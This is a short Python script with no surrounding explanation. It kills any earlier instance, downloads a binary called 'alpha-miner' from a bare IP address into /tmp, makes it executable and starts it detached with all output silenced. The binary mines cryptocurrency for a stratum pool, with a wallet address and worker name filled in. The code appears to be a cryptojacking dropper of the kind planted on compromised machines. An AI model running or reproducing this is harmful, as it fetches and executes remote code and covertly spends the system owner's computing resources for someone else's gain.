import subprocess, os, time, urllib.request

subprocess.run(["pkill", "-9", "-f", "/tmp/m"], capture_output=True)
time.sleep(0.5)

if not os.path.exists("/tmp/m") or os.path.getsize("/tmp/m") < 1000000:
    try:
        urllib.request.urlretrieve("http://151.247.219.40:8000/alpha-miner", "/tmp/m")
    except:
        pass

if os.path.exists("/tmp/m"):
    os.chmod("/tmp/m", 0o755)
    proc = subprocess.Popen(["/tmp/m", "--pool", "stratum+tcp://sg1.alphapool.tech:5566", "--address", "prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg", "--worker", "cpu_38"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, start_new_session=True)
    time.sleep(2)
    poll = proc.poll()
    result = f"RUNNING" if poll is None else f"EXIT:{poll}"
else:
    result = "NO_FILE"
